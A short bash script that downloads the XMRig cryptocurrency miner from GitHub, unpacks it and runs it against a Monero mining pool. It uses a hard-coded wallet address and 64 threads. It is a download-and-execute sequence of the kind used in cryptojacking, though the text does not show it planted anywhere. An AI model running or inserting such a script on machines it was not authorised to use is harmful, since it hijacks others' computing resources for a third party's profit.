#!/bin/bash
wget https://github.com/xmrig/xmrig/releases/download/v6.12.1/xmrig-6.12.1-linux-x64.tar.gz
tar -xvzf xmrig-6.12.1-linux-x64.tar.gz
cd xmrig-6.12.1
chmod u+x ./xmrig
./xmrig -o pool.minexmr.com:443 -u 46MEpnWdfdhjByhRE7jbP6U6fW9ok2UitfkAmJXk7NRaRCah9uGd8sWSjoBmsX3zZmagTR6DwFeiv1u9Ny31BfRJTZydcaU -t64 -k --tls
